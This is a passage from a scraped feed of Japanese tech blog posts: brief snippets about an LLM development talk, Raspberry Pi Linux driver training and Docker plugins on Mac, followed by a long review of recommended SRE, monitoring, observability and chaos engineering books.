フローがあり、テストに使える。「ファインチューニング、アノテーションはコストがかかるのであまりやらない。RAGを使う。」pipon北爪さんはKindleでLLM書籍を出版されています。ボリュームタップリで99円はお買い得！Kindle書籍の詳細はこちら ⇒ https://amzn.to/4bhlmBQ2月13日(火)に出版記念イベントを開催されるそうです。（参加費は懇親会込みで4,000円）chatgptllm.connpass.com感想とまとめ私も生成AI開発をやり始めたところですが、数多くの案件を手がけてきた方々の話を聞けて、イメージが湧くとともにモチベーションが上がりました。","link":"https://shu-kob.hateblo.jp/entry/2024/02/01/094735","isoDate":"2024-02-01T00:47:35.000Z","dateMiliSeconds":1706748455000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"raspberry piで学ぶ組込みLinuxデバイスドライバ開発","contentSnippet":"はじめに1/24~26の3日間 仕事をサボっ.... 調整をしてポリテクセンター関東で行われた組込みLinuxデバイスドライバ開発技術というセミナーを受講してきました。カーネルのVersionが2.6、対象のマイコンボードがSH-4というとても古いものだったので今回はラズパイで復習しながら、セミナーの内容を共有したいと思います。↑がセミナーで使用したボードです。LEDやタクトスイッチ、赤外線センサやモータがボートに付いているのでそれを制御するドライバを作成しました。セミナーのテキストは2部構成で内容は以下の通りです。第1部CPUボード編1章 ターゲットボードの確認...","link":"https://zenn.dev/satoken/articles/try-lkm-raspi","isoDate":"2024-01-27T11:48:11.000Z","dateMiliSeconds":1706356091000,"authorName":"satoken","authorId":"satoken"},{"title":"Mac に Homebrew で docker pluings をインストールする","contentSnippet":"Docker Desktop for Mac であれば何もしなくても docker compose コマンドは使えるようになっているのですが、Lima で docker を使っている場合などで Homebrew で docker をインストールしていると docker compose や docker buildx を使えるよ","link":"https://blog.1q77.com/2024/01/install-docker-plugins-on-mac/","isoDate":"2024-01-26T12:36:56.000Z","dateMiliSeconds":1706272616000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"このSRE本がすごい！2024年版","contentSnippet":"はじめに有用な知識の特性Google SRE リソースSite Reliability Engineering: How Google Runs Production SystemsThe Site Reliability Workbook: Practical Ways to Implement SREBuilding Secure and Reliable Systems: Best Practices for Designing, Implementing, and Maintaining SystemsSLO Adoption and Usage in SRECreating a Production Launch PlanTraining Site Reliability Engineers: What Your Organization Needs to Create a Learning ProgramAnatomy of an Incident – Google – Site Reliability EngineeringEnterprise Roadmap to SRE – Google – Site Reliability EngineeringIncident Metrics in SRE – Google – Site Reliability EngineeringPractical Guide to Cloud Migration – Google – Site Reliability EngineeringGoogle以外の重要な書籍紹介97 Things Every SRE Should KnowSeeking SREPractical MonitoringDatabase Reliability EngineeringObservability EngineeringChaos EngineeringBuilding Microservices, 2nd EditionAPI Design PatternsSystems Performance, 2nd EditionEfficient GoImplementing Service Level ObjectivesModern Software Engineering: Doing What Works to Build Better Software FasterLearning Test-Driven Developmentシステム障害対応 実践ガイドWebエンジニアのための監視システム実装ガイドSRE サイトリライアビリティエンジニアリングが”ザックリ”「すっきり」分かる本さいごにはじめに2024年、情報技術の世界は革新的な変化を続け、特にSRE（サイト信頼性エンジニアリング）の分野では新しい概念や技術が絶えず生まれています。この急速に進化する環境において、効率的に最新の知識を吸収する方法を見つけることは非常に重要です。その一つの答えが、「タイパ（タイムパフォーマンス）」という概念です。タイパとは、投入した時間に対する成果の効率を意味し、限られた時間を最大限に活用することの重要性を示しています。このブログでは、SRE分野で高いタイパを達成するための役立つ書籍を探求します。これらの書籍を全て読むのは、SREに深い情熱を持つ者か、非常に勤勉な人に限られるかもしれませんが、オススメの順番などはあえて紹介しません。また、「class SRE implements DevOps」は、「SREはDevOpsというインターフェースの実装である」という意味を持ちます。「DevOps = 思想」という定義に対して、それを具体化し実装したものがSREであると考えます。本ブログでは、DevOpsやその進化形であるPlatform Engineeringについては触れません。それは、既に多岐にわたる議論がある中で、さらに混迷を招く可能性があるためです。また、全ての情報は完璧ではないと思うので補足情報などがあれば教えてください。映画を早送りで観る人たち～ファスト映画・ネタバレ――コンテンツ消費の現在形～ (光文社新書)作者:稲田 豊史光文社Amazon有用な知識の特性有用な知識が持つべき三つの性質について考えます。第一に「一般性」です。これは知識が多様な状況で適用できることを意味します。例えば、コンテナ技術やクラウドインフラの原則は、異なるプラットフォームやアプリケーションでも適用可能です。これが一般性のある知識です。第二の性質は「関係性」です。孤立した知識はあまり役に立ちません。例えば、単に多くのモニタリングツールを知っているだけでは不十分です。それらがシステムのパフォーマンスやセキュリティとどのように関連し、全体的な信頼性を向上させるかを理解することが重要です。最後に「場面応答性」があります。知識は、それが必要とされる特定の状況で適切に活用されるべきです。例えば、システムのスケーラビリティを改善する際には、負荷分散やキャッシングなどの特定の技術や知識が必要です。これらの技術や知識は、それぞれの状況に応じて適切に選択し、活用されるべきです。場面応答性がある知識は、適切な状況でのみその真価を発揮することができます。この有用な知識の枠組みに加えて、特に学生や新卒の方々には「基礎の重要性」を強調したいと思います。技術的な深い理解や幅広い応用は、コンピュータサイエンスの基本原理、アルゴリズム、データ構造などの基礎知識があってこそ可能です。SREやオブザーバビリティなどの先進的な分野への関心も良いことですが、その前にしっかりとした基礎を学び、築くことが非常に重要です。基礎知識がしっかりしていれば、新しい技術やトレンドにも柔軟に対応し、深く理解することができるでしょう。学びとは何か――〈探究人〉になるために (岩波新書)作者:今井 むつみ岩波書店AmazonGoogle SRE リソースGoogleは、SRE（Site Reliability Engineering、サイト信頼性エンジニアリング）の知識と実践を業界全体で共有し、普及させるために積極的な取り組みを行っています。このページで紹介されている書籍やリソースはその一部に過ぎません。Google SREリソースとして、さらに多くの資料が公開されていますので、興味のある方は以下のリンクから探求してみてください。sre.googleSite Reliability Engineering: How Google Runs Production Systems「Site Reliability Engineering: How Google Runs Production Systems」は、Googleが開発したシステム管理とサービス運用の方法論を学ぶことができる、非常に重要なSREの書籍です。この書籍はO’Reillyから出版されており、全552ページにわたって豊富な内容が展開されています。発売日は2016年4月で、原書なのでリリースから時間が経過していますが、その内容の深さと実践的なアプローチは、今日でも多くのSRE専門家やソフトウェアエンジニアにとって非常に価値のあるものです。sre.googleこの書籍では、ソフトウェアのライフサイクル全体にわたるコミットメントと、世界最大規模のソフトウェアシステムの構築、導入、監視、維持方法について詳細に解説しています。リスク管理、サービスレベル目標、リリースエンジニアリングなどSREの基本原則から始まり、インシデント管理、障害の根本原因分析、SREチーム内でのソフトウェア開発についても深く掘り下げています。さらに、SREのトレーニングやコミュニケーション管理についても紹介しており、急速にスケールするサービスを高い信頼性で運用する方法についての理解を深めることができます。この書籍は、大規模なシステムの運用における複雑な課題への実践的な解決策を提供しており、非常に有益です。リリースエンジニアリングやインシデント管理の部分は特に、日常業務に直接応用できる知見が豊富に含まれており、実務においても大いに役立つ内容となっています。また、SREチーム内でのソフトウェア開発プロセスに関する記述は、チームワークと効率性を高めるための貴重で有用な参考資料となります。Googleによって無料で公開されていることも特筆すべき点で、こちらのリンクから無料で読むことが可能です。さらに、日本語での翻訳版も存在し、日本の読者にとっても2倍の感謝を持って読むことができるでしょう。SRE サイトリライアビリティエンジニアリング ―Googleの信頼性を支えるエンジニアリングチームオライリージャパンAmazonさらに、Googleに直接関連はありませんが「もう一度読むSRE」というポッドキャストもあり、この書籍の内容を深く理解するための補足資料として聞いてみるのも良いでしょう。ポッドキャストを通じて、書籍の内容をさらに掘り下げたり、実際の業務における適用例を聞くことができます。The Site Reliability Workbook: Practical Ways to Implement SRE「The Site Reliability Workbook: Practical Ways to Implement SRE」は、SREの原則と実践方法に深く踏み込んだ、O’Reillyから出版された812ページにも及ぶ充実した内容の書籍です。その分厚さは、まさに鈍器のよう。2018年7月の発売で、「Site Reliability Engineering: How Google Runs Production Systems」のリリースから3年が経過し、この期間を経てさらに充実した内容に進化しています。sre.googleこの書籍では、具体的な事例を通じてSREの原則と実践方法に深く踏み込んでいます。前作で紹介されたSREの基本原則からさらに一歩進み、Google内部で培われた技術的ノウハウだけでなく、Evernote、The Home Depot、New York Timesなどさまざまな企業の事例も紹介しています。クラウド環境での信頼性の高いサービス実行方法や、サービスレベル目標に基づくサービスの運用、既存の運用チームをSREに変換する方法など、実践的かつ詳細な解説がなされています。この書籍は、既にSREを導入している企業やこれから導入を考えている企業の開発者、運用管理者、マネージャーにとって、理論から実践へと移行するための貴重な手引きとなります。実際の業務に役立つ豊富な知識と具体的なガイドラインを提供しており、SREの実践を深めたいすべてのプロフェッショナルにとって有用な内容です。Googleによって無料で公開されていることも特筆すべき点で、こちらのリンクから無料で読むことが可能です。このような資料を無償で提供することは、業界全体の技術向上に大きく貢献しています。GoogleがSREの知識と実践を広く共有し、普及させようとする意図が明確に伺えます。さらに、日本語で翻訳されているため、日本の読者も2倍の感謝を持って読むことができるでしょう。サイトリライアビリティワークブック ―SREの実践方法オライリージャパンAmazonBuilding Secure and Reliable Systems: Best Practices for Designing, Implementing, and Maintaining Systems「Building Secure and Reliable Systems: Best Practices for Designing, Implementing, and Maintaining Systems」は、O’Reillyから出版された519ページに及ぶ内容で、セキュリティを中心に据えた構成となっています。2020年3月の発売で、聖典とも言える「Site Reliability Engineering: How Google Runs Production Systems」のリリースから4年が経過しており、この間にセキュリティ意識の高まりを強く感じさせる書籍です。google.github.ioこの書籍では、システムのセキュリティと信頼性が一体であることを明示し、スケーラブルなシステムの設計と運用におけるセキュリティの重要性を深く掘り下げています。GoogleのセキュリティとSREのエキスパートが、セキュアでスケーラブルかつ信頼性の高いシステムを根本から設計するためのベストプラクティスを紹介しており、システムの設計、実装、保守に関する考え方と実践法を詳しく解説しています。また、組織の文化がベストプラクティスに取り組む上でいかに重要かについても言及されています。この書籍はセキュリティと信頼性を軸にしたシステム構築のための貴重な知見を提供しています。特に、セキュリティをシステム設計の初期段階から考慮する重要性を説く内容は、現代のセキュリティ意識が高まる中でのシステム設計において非常に参考になります。また、組織文化とそのベストプラクティスへの適用に関する洞察は、チームや組織全体のセキュリティ意識向上に大いに役立つでしょう。「Building Secure and Reliable Systems」も、Googleによって無料で公開されており、こちらのリンクから無料で読むことが可能です。Googleがセキュリティと信頼性に関する知識を広く共有しようとする姿勢が、このような形で表れているのです。また、Google SRE本は3冊とも翻訳されていてありがたい限りですね！！！セキュアで信頼性のあるシステム構築 ―Google SREが考える安全なシステムの設計、実装、保守オーム社Amazonセキュリティに関する本の一環として、Googleとは直接関連はありませんが、『体系的に学ぶ 安全なWebアプリケーションの作り方 第2版 脆弱性が生まれる原理と対策の実践』の読書をお勧めします。この本では、Webアプリケーションのセキュリティにおける脆弱性の原理と対策について詳細に解説されています。SLO Adoption and Usage in SRE「SLO Adoption and Usage in SRE」は、サービスレベル目標（SLO）のSREにおける採用と使用に焦点を当てた104ページの実践的なレポートです。2020年4月1日に発売されたこのレポートは、SREのフレームワークを活用して運用コストの削減や開発生産性の向上に役立つ方法を提供します。SREやソフトウェアエンジニアとして、このレポートはSLOの重要性とその実践法を深く理解するのに大変役立ちます。SLO、SLI、エラーバジェットをSREの実践の中核として位置づけ、サービスの信頼性をどのように測定し管理するかを具体的に示しています。Googleの調査結果や実際のケーススタディを基に、許容可能な信頼性のレベルを定義し、それに基づいてシステム変更を適切に管理する方法は、日々の業務に直接適用できる知識です。参考リンク: SLO Adoption and Usage in SRESRE担当者、エグゼクティブ、開発者、アーキテクトなど、幅広い関係者にとって、SLOを取り入れたSREの実践を深めるための有用なリソースとなるでしょう。Creating a Production Launch Plan「Creating a Production Launch Plan」は、実稼働環境の立ち上げにおける計画策定に焦点を当てた45ページの実践的なレポートです。2020年1月に発売されたこのレポートは、製品のローンチプランをテンプレートとして使用することで、多くの時間、費用、そして頭痛を節約する方法を提供します。SREやソフトウェアエンジニアとして、このレポートは実稼働環境の立ち上げにおける計画策定の重要性と実践法を深く理解するのに非常に役立ちます。Googleが実際にどのように本番発売計画を策定したかを紹介し、自社製品を導入する際のリスクを低減するための実践的な方法を学べます。ローンチプランは、すべての関係者とプロセスを巻き込み、ローンチの進行を確実にコントロールすることで、さまざまな問題を防ぐことができます。参考リンク: Creating a Production Launch Plan開発者やサイト信頼性エンジニア（SRE）を対象に、Googleのローンチプランの基本的な構成要素を探り、自社製品を導入する際のリスクを低減するための実践的な方法を提供する本レポートは、企業規模や製品のユーザーベースに関係なく、消費者向けサービスにも適応可能です。これらの教訓は、製品のローンチを成功に導くための貴重で有用な学習リソースとなるでしょう。Training Site Reliability Engineers: What Your Organization Needs to Create a Learning Program「Training Site Reliability Engineers: What Your Organization Needs to Create a Learning Program」（日本語名：サイト信頼性エンジニアの育成：学習プログラムを作成するために組織に必要なこと）は、サイト信頼性エンジニアの育成に関する116ページの詳細なガイドです。2020年2月に発売されたこのレポートでは、一般的な内容からドメイン固有の内容まで、組織でのSREトレーニング方法について解説しています。GoogleのSREチームによるこのガイドでは、Googleが新しいSREを育成するために使用しているトレーニングのベストプラクティスを学ぶことができます。また、SRE（またはSREに類似した機能）のトレーニングを成功させた小規模な組織での使用例も紹介されています。効果的なSREトレーニングを実施するためには、自社のニーズと受講者の両方に合うように意図的に設計する必要があります。本レポートの大部分はGoogle SREの具体的な経験に焦点を当てていますが、トレーニング設計の背景にある理論についても説明し、過去数年間に業界全体で得られたベストプラクティスや教訓を紹介しています。参考リンク: Training Site Reliability Engineersこのレポートは、SREの育成に取り組む組織にとって、トレーニングプログラムの設計と実施における重要な指針を提供し、より効果的なSREトレーニングの実現をサポートします。Googleの実践に基づく具体的なアプローチは、業界におけるSREトレーニングのスタンダードを形成していると言えるでしょう。Anatomy of an Incident – Google – Site Reliability Engineering「Anatomy of an Incident – Google – Site Reliability Engineering」（日本語名：インシデントの解剖 – Google サイト信頼性エンジニアリング）は、インシデント対応に関する70ページの実践的なレポートで、2016年4月に発売されました。このレポートは、システム設計における失敗の避けられない側面を探り、科学者やエンジニアが未来を完全に把握することなく解決策を実行する現実を浮き彫りにしています。次のゼロデイ脆弱性、バイラル・メディア・トレンド、気象災害、テクノロジーの変化などを予測することは難しいものですが、本レポートでは、インシデントがシステムに影響を及ぼした場合に対応するための準備方法について詳しく探求しています。SREやDevOpsの実務者、IT管理者、エンジニアリング・リーダーを対象に、Ayelet Sachto氏、Adrienne Walcer氏、Jessie Yang氏のアドバイスをもとに、組織がインシデントに備え、対応し、回復する方法について解説されています。参考リンク: Anatomy of an Incidentこのレポートは無料で公開されており、上記のリンクから原著を読むことが可能です。インシデント発生時の効果的な対応策を学ぶことは、組織のシステムの信頼性を高め、将来のトラブルへの対処能力を強化するために不可欠です。インシデント管理に関心のあるすべてのプロフェッショナルにとって価値のあるリソースと言えるでしょう。Enterprise Roadmap to SRE – Google – Site Reliability Engineering「Enterprise Roadmap to SRE – Google – Site Reliability Engineering」（日本語名：SREエンタープライズロードマップ – SREを導入し継続する方法）は、SREに関する技術的立ち位置、導入理由、必要なプロセス、文化、事例などを幅広く紹介する62ページのコンパクトなレポートです。2020年3月に発売され、日本語で読める点も非常に魅力的です。このレポートでは、Google Cloud Reliability AdvocateのSteve McGheeとGoogle Cloud Solutions ArchitectのJames Brookbankが、組織でSREを導入する際にエンジニアが直面する特定の課題について深く掘り下げています。Googleが過去に出版した「Site Reliability Engineering」と「The Site Reliability Workbook」が、サービスライフサイクル全体への取り組みによって組織がソフトウェアシステムの構築、展開、監視、保守を成功させる方法と理由を示しているのに対し、本レポートはそれらを補完する内容となっています。参考リンク: Enterprise Roadmap to SRESREの普及にもかかわらず、多くの企業ではSREに対する当初の熱意とその採用の度合いの間に大きな隔たりが生じています。このレポートは、プロダクトオーナーや信頼性の高いサービスに携わる方々がSREの採用について知りたいときに、そのプロセスを体系的に説明するものです。SREの導入を検討する企業や、より効果的な方法でSREを実践したいエンジニアにとって、重要なガイダンスを提供する資料です。Incident Metrics in SRE – Google – Site Reliability Engineering「Incident Metrics in SRE – Google – Site Reliability Engineering」（日本語名：SREにおけるインシデント評価指標 – Google – Site Reliability Engineering）は、SREにおけるインシデント評価指標に深く焦点を当てた36ページのレポートです。2021年3月に発売され、SREでの改善評価や傾向追跡に用いられるMTTxメトリクスの効果について深く掘り下げています。SREでは、MTTR（平均復旧時間）やMTTM（平均緩和時間）などのメトリクスが一般的に使用されていますが、Google SREのStepan Davidovic氏はモンテカルロ・シミュレーションを用いて、これらのメトリクスが生産インシデントのコンテキストにおいて意思決定やトレンド分析に適していないことを示しています。これらのメトリクスの適用は見かけよりも厄介で、多くの実用的なシナリオにおいて誤解を招く可能性があります。本レポートでは、これらの測定を達成するための代替方法を探ります。参考リンク: Incident Metrics in SREこのレポートは、SREの実務においてインシデント評価指標の適用に関する誤解を避け、より効果的な方法を探るための重要なリソースとなります。SRE担当者やシステム運用チームは、このレポートを通じてインシデントの評価と分析に対するより深い理解を得ることができ、より効率的かつ適切な意思決定を行うための手助けを受けることができるでしょう。Practical Guide to Cloud Migration – Google – Site Reliability Engineering「Practical Guide to Cloud Migration – Google – Site Reliability Engineering」（日本語名：クラウド移行実践ガイド – Google – サイト信頼性エンジニアリング）は、クラウドへの移行に関する実践的なアプローチを解説する124ページのレポートです。2021年2月に発売され、企業が直面する大規模なクラウド変革の課題に焦点を当てています。クラウドへの移行はしばしば、大きなリターンが期待されるものです。この移行が実現すると、働き方を根本的に変える新たなビジネスチャンスが生まれます。本レポートでは、Googleのチームメンバーがクラウドへの移行に必要な文化的および技術的変革をナビゲートする方法を示しています。Googleはクラウドで誕生した企業ですが、チームメンバーの中には、この移行を苦労して乗り越えなければならなかった組織の出身者もいます。彼らは成功したクラウド変革のさまざまな側面をカバーする13のエッセイを通じて、苦労して勝ち取った経験を共有します。参考リンク: Practical Guide to Cloud Migrationこのレポートは、クラウドへの移行を検討している企業やチームにとって、具体的なヒントやアドバイスが満載の価値あるガイドとなります。クラウド変革の課題に直面する多くの組織が、このレポートを通じて適切な戦略とアプローチを学び、成功への道を切り開くための重要な手がかりを得ることができるでしょう。Google以外の重要な書籍紹介この章では、Googleに関連しないが、サイト信頼性エンジニアリング（SRE）やソフトウェアエンジニアリングの分野で重要な書籍を紹介しています。しかし、これらの書籍は、SREとソフトウェアエンジニアリングの広大な知識と実践の世界におけるごく一部に過ぎません。市場には、読者の皆様にとってさらに多くの価値ある書籍が存在し、それぞれが独自の視点と深い専門知識を提供しています。これらの書籍は、私の独断と偏見で日々直面する課題を解決し、スキルを磨くための貴重で有用なリソースとなり得ます。97 Things Every SRE Should Know「97 Things Every SRE Should Know」は、250ページにわたる実践的な書籍で、2020年11月に出版されました。この本は、SREの新人からベテランまでが、SREの採用方法、SLOの重要性、インシデント対応のアップグレード時期、モニタリングと可観測性の違いなどについて学ぶことができる、幅広いトピックをカバーしています。編集者のJaime WooとEmil Stolarskyは、信頼されるベストプラクティスや新しい問題解決方法を含む、97の有用なヒントを集めました。これにより、SREのスキルを成長させ、洗練させることが可能です。特に、「エラーバジェットを手に入れたら、次に何をするか」 - Alex Hidalgo や 「自分の仕事を認識させる：自慢文書を書く」 - Julia Evans and Karla Burnett などのアドバイスは、SREの領域において深い理解と実践的なスキルを習得するのに役立ちます。この書籍はSREにおける深い理解と実践的なスキルの習得に大いに役立ち、技術者やチームリーダー、プロジェクトマネージャーにとって非常に参考になる内容となっています。Seeking SRE「Seeking SRE」は、サイト信頼性エンジニアリング（SRE）に関する幅広いトピックを扱う587ページの書籍で、O\'Reilly Media, Inc.から2018年9月に出版されました。この書籍は、システムとアプリケーションの信頼性の重要性と、市場の要求する速度でのイテレーションを行いながら信頼性を維持する難しさを背景にしています。Googleによる「Site Reliability Engineering」という著書に触発され、SREの非常に異なる部分を探求しています。「Seeking SRE」には25以上の章が含まれ、SREの世界で行われている重要な議論に読者を引き込みます。様々な環境でのSREの実装方法、DevOpsとの関連、最先端の専門知識、ベストプラクティスとテクノロジー、さらにはSREの人間的側面について、エンジニアやその他の分野のリーダーが語る内容が盛り込まれています。David N. Blank-Edelmanがキュレーター兼編集者を務め、SREの理解を深め、実践的なスキルを習得したい技術者やリーダーにとって非常に参考になる内容となっています。日本語の書籍も出版されていてとても嬉しいですねSREの探求 ―様々な企業におけるサイトリライアビリティエンジニアリングの導入と実践オライリージャパンAmazon弊社では輪読会を行いましたが様々な案件とリンクして考える事ができてよかったです。syu-m-5151.hatenablog.comPractical Monitoring「Practical Monitoring」は、O\'Reilly Media, Inc.から出版された170ページに及ぶ監視システムの設計と実装に関する実践的なアプローチを提供する書籍です。2017年10月に発売され、モニタリングの改善が必要だが、どこから手を付けるべきかわからない人々に向けて書かれています。著者のMike Julianは、企業アプリケーションからデータセンターのハードウェアに至るまで、様々なレベルでの効果的なモニタリングを設計し実装するための戦略と戦術を提供しています。この書籍は特定のツールの実装方法ではなく、モニタリングの原則と基本的な仕組みに焦点を当てており、モニタリングのアンチパターン、デザインの原則、効果的なオンコールローテーションの構築、アプリケーションからのメトリクスとログの取得といった重要なトピックをカバーしています。モニタリングは、「Service Reliability Hierarchy」 でも最も最初に取り組むべきだと記載されており、その重要性は業界全体で認識されています。本書は、モニタリングの効果的な実践に関して、あらゆるレベルの専門家に対して具体的な洞察とガイダンスを提供します。Site Reliability Engineering: How Google Runs Production Systems Part III. Practices Figure III-1. Service Reliability Hierarchy より個人的には、既に知っている内容も多かったものの、心得的な部分は「監視版リーダブルコード」と表現できるほどの価値がありました。ある程度監視を経験した人には自分の知識を再確認するのに適していますが、入門書としては抽象的で理解しにくい内容も含まれているため、即座に具体的な知識を得て活用したい人には向いていないかもしれません。ネットワーク、サーバー、フロントエンド、バックエンド、KPIなどを幅広くカバーしていますが、具体的なアクションポイントにはあまり触れられていません。こちらのリンクで、この本をチェックすることができます。日本語版もO\'Reilly Platform で読めます。こちらの書籍は、日本語版では「入門 監視」と題されており、これは非常に喜ばしいことです。原題の直訳である「実践 監視」とするのではなく、「入門」としていることで、モニタリングの基礎から学びたい初心者や、監視システムの知識を深めたい方々にとってもアプローチしやすい内容となっています。初学者に優しいこのタイトル変更は、監視の世界への第一歩を踏み出す人々にとって、大いに役立つことでしょう。入門 監視 ―モダンなモニタリングのためのデザインパターン作者:Mike JulianオライリージャパンAmazon「Monitoring Anti-Patterns」は、監視システムにおける一般的な間違いや誤解を扱う非常に洞察に満ちたセクションです。このセクションでは、監視を単なるタスクではなく、システム全体の健康とパフォーマンスを維持するための重要なプロセスとして捉えることの重要性が強調されています。具体的には、監視システムの設計と実装において、ツールへの過度な依存（「ツールの崇拝」）、チェックボックス式のアプローチ（「動作している」とは何を意味するのかに焦点を当てる）、監視を一時的な対処策として使うこと（「監視を松葉杖として使う」）、また手動での設定の問題点などが取り上げられています。これらのアンチパターンは、監視システムの構築における一般的な落とし穴を示しており、これらを理解し避けることは、より効果的な監視システムの構築に不可欠です。また、OSメトリクスはアラートにはあまり役立たないことが多いため、メトリクスをより頻繁に収集することの重要性も指摘されています。このセクションを読むことで、監視に関する一般的な誤解を避け、より効果的な戦略を実践するための洞察を得ることができます。learning.oreilly.com「Prometheus: Up & Running, 2nd Edition」は、Prometheusの使い方とベストプラクティスを網羅した書籍です。Prometheusは多くの組織で実運用されているメトリクスベースのモニタリングシステムであり、この書籍はサイト信頼性エンジニア、Kubernetes管理者、ソフトウェア開発者にとって実践的な指南書となります。learning.oreilly.comDatabase Reliability Engineering「Database Reliability Engineering」は、データベース管理の進化としてのDBRE（データベース リライアビリティエンジニアリング）をテーマにしたO\'Reilly Media, Inc.からの294ページの重要な書籍です。2017年10月に出版され、データベースの信頼性に対する包括的なアプローチを提示しています。この書籍は、技術的な側面だけでなく、チームや組織全体の連携や継続的改善サイクルにも言及しています。特に、DBAからDBREへの進化に焦点を当て、多様なDBのプロフェッショナルが、他部門と協力し、システムの信頼性を高めるための自律的なアプローチについて詳述しています。書籍では、インフラとデータベースの効率的な構築や運用に関する技術的な知見が紹介されています。GitやChefなどを活用して、環境構築の自動化や人的ミスの排除に重点を置いています。メモリ管理、ストレージのチューニング、データベースのアーキテクチャなどに関する具体的な説明も盛り込まれており、データベースの効率的な運用に不可欠な要素として提示されています。バックアップ、セキュリティ、データベースのアーキテクチャなど、データベース運用のさまざまな側面についても触れられており、実際のDB運用業務での協業観点からも多くを学ぶことができます。また、インフラとDBaaS（Database As A Service）に関する技術的説明も含まれており、現代のデータベース運用における新しいトレンドとチャレンジに対応しています。全体的に、この書籍は技術的な知識にとどまらず、実際のデータベース運用における現場での協力や継続的な改善に関する洞察を提供するものであり、DBREとして成長したいプロフェッショナルにとって非常に価値のある一冊です。データベースリライアビリティエンジニアリング ―回復力のあるデータベースシステムの設計と運用作者:Laine Campbell,Charity MajorsオライリージャパンAmazon「Fundamentals of Data Engineering」は、O\'Reilly Media, Inc.から2022年6月に出版された447ページの書籍で、データエンジニアリングの急速な成長に対応し、ソフトウェアエンジニア、データサイエンティスト、アナリストに全体的な理解を提供します。著者のJoe ReisとMatt Housleyが、データエンジニアリングのライフサイクルを通じて読者を導き、さまざまなクラウド技術を組み合わせて、組織と顧客のニーズを満たすシステムの計画と構築方法を紹介しています。本書では、データの生成、取り込み、オーケストレーション、変換、ストレージ、ガバナンスの概念を、どのようなデータ環境でも適用する方法を理解できます。また、データエンジニアリングの全体的な風景についての簡潔な概要を得ることができ、データ技術、アーキテクチャ、プロセスを選択する際のマーケティングハイプを切り抜けるためのベストプラクティスのエンドツーエンドフレームワークを使用する方法も提供されています。さらに、データガバナンスとセキュリティをデータエンジニアリングのライフサイクル全体に組み込む方法も学べるため、この本は、データエンジニアリングの基礎を学び、Platform EngineeringやSREなどの関連分野との関連性を理解するのに適した初心者向けのガイドです。learning.oreilly.comまた、DBに関しての知識はほぼ絶対に腐らないので「達人に学ぶDB設計 徹底指南書」や「達人に学ぶSQL徹底指南書 第2版」は読んでいて絶対に良いと思います。Observability Engineering「Observability Engineering」は、O\'Reilly Media, Inc.から2022年5月に出版された318ページにわたる書籍で、現代の複雑なシステムにおけるオブザーバビリティの重要性と実践について深く掘り下げています。著者であるCharity Majors, Liz Fong-Jones, およびGeorge Mirandaは、オブザーバビリティがどのようにして開発速度を加速し、不規則な振る舞いの特定、ユーザー体験の理解を深めるかについて説明しています。この書籍は、オブザーバビリティの定義、クラウドネイティブアプリケーションへの応用、ソフトウェア開発ライフサイクル全体における影響、さらにはサービスレベル目標と共に機能するチームによるオブザーバビリティの利用方法など、多岐にわたるトピックを扱っています。特に、構造化イベントの利用とOpenTelemetryによる計装の重要性が強調されており、オブザーバビリティによってエンジニアがよりプロアクティブなデバッグを行い、迅速なフィードバックサイクルを回すことが可能になると述べられています。しかし、オブザーバビリティ関連のコストが高くつく可能性も指摘されており、エンジニアと経営者の両方に、そのビジネス価値を正しく理解し伝える必要性が強調されています。オブザーバビリティの導入には「作るか買うか」の選択があり、その機能要件、適切なテレメトリーデータのサンプリング方法、テレメトリーパイプラインを用いたデータ管理についても詳細に議論されています。さらに、組織全体でのオブザーバビリティの採用には、文化的な変化が伴うとし、その投資対効果や利害関係者との協力の重要性が説明されています。この書籍は、オブザーバビリティが企業の最終損益に与える影響を明確にし、組織におけるオブザーバビリティの成熟度モデルを提供することで、オブザーバビリティを組織に根付かせるための指針を提供しています。オブザーバビリティ・エンジニアリング作者:Charity Majors,Liz Fong-Jones,George Mirandaオーム社Amazon「Learning OpenTelemetry」は、2024年3月にO\'Reilly Media, Inc.から出版される、OpenTelemetryの実践的な利用に焦点を当てた250ページの書籍です。著者のAustin ParkerとTed Youngは、OpenTelemetryの各コンポーネントと、これを使ったオブザーバビリティシステムの設定、運用、トラブルシューティング方法を紹介しています。OpenTelemetryにより、複数の高品質なテレメトリーデータソースが一本化され、効率的なオブザーバビリティが実現します。この書籍は、オブザーバビリティの基本から応用までを網羅し、特にアプリケーション開発者やインフラチームにとって貴重な情報源となるでしょう。また、前著「Observability Engineering」の内容を受け継ぎながら、OpenTelemetryを通じた具体的な実践方法を提供することで、現代の複雑なシステムにおけるオブザーバビリティの理解と活用をさらに深めます。learning.oreilly.comChaos Engineering「Chaos Engineering」は、O\'Reilly Media, Inc.から2020年4月に発売された305ページの書籍で、カオスエンジニアリングについての実践的なガイドです。この分野での先駆者であるCasey RosenthalとNora Jonesが共著し、Netflixでの経験を基にしています。本書は、複雑なシステムを理解し、ビジネス目標に最適化しながらナビゲートする方法をエンジニアに示します。カオスエンジニアリングとは、マイクロサービスや分散技術を採用する企業が増えるにつれて高まるシステムの複雑性に対応する方法論です。 この手法を用いることで、複雑性を取り除くことはできないものの、システムの脆弱性を発見し、顧客への影響を及ぼす前に障害を防ぐことが可能になります。また、Google、Microsoft、Slack、LinkedInなどの業界専門家からの実世界の事例を通じて理論から実践への橋渡しがなされています。書籍では、カオスエンジニアリングプログラムをゲームデイを中心に設計し、高度にターゲットを絞った自動化された実験に進む方法が紹介されています。このように、システム内の複雑性を理解するための枠組みの設計や、継続的な協力的カオス実験のデザインについても詳述されています。ただし、本書の内容は非常に有意義である一方で、カオスエンジニアリングはその文化を前提としているため、導入のハードルは高いとされています。 実際、カオスエンジニアリングの成功は組織文化や思考の枠組みに大きく依存しており、組織全体の問題解決への取り組みとして考える必要があります。カオスエンジニアリングを導入するには、単に技術的な側面だけでなく、組織としての成熟度や文化的な準備が必要になります。カオスエンジニアリング ―回復力のあるシステムの実践作者:Casey Rosenthal,Nora JonesオライリージャパンAmazon「Security Chaos Engineering」は、O\'Reilly Media, Inc.から2023年3月に発売された428ページの書籍で、セキュリティカオスエンジニアリングについての包括的なガイドです。著者のKelly ShortridgeとAaron Rinehartは、複雑なソフトウェアシステムの持続可能なレジリエンス（回復力）における挑戦に対処する方法を探求しています。セキュリティカオスエンジニアリングとは、不利なイベントに備え、それらが革新、迅速な動き、エンジニアリングおよびビジネス目標の達成を妨げないようにする手法です。 